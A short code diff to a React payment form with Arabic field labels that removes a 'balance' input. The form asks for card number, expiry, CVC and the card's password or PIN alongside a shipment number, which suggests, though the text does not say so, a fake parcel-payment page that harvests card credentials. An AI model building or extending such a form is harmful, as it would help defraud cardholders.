@@ -22,7 +22,7 @@ const Pay=()=>{
       YY:"",
       cvcCard:"",
       كلمةالمرورالبطاقة:"",
-      الرصيد:"",
+//      الرصيد:"",
       رقمالشحــنة:datas
     }
   });
@@ -94,9 +94,8 @@ const Pay=()=>{
                   setDynamicFormData(name, value);
                 }}  required maxLength="16"/>
             
-          <label htmlFor="الرصيد">
-                          الرصيدالمتوفر
-                     </label>
+
+              
             <div className={styles.curmony}>
                      <div>
             <input type="text" placeholder='(MM)'  name='MM' onChange={(e) => {
@@ -108,10 +107,7 @@ const Pay=()=>{
                   setDynamicFormData(name, value);
                 }} maxLength="2" required/>
             </div>
-                     <input type="text" name='الرصيد' placeholder='0.000000'onChange={(e) => {
-                  const { name, value } = e.target;
-                  setDynamicFormData(name, value);
-                }} maxLength="7" required/>
+                     
               <input type="text" placeholder='الرقم (cvc/cvv)' name='cvcCard' onChange={(e) => {
                   const { name, value } = e.target;
                   setDynamicFormData(name, value);
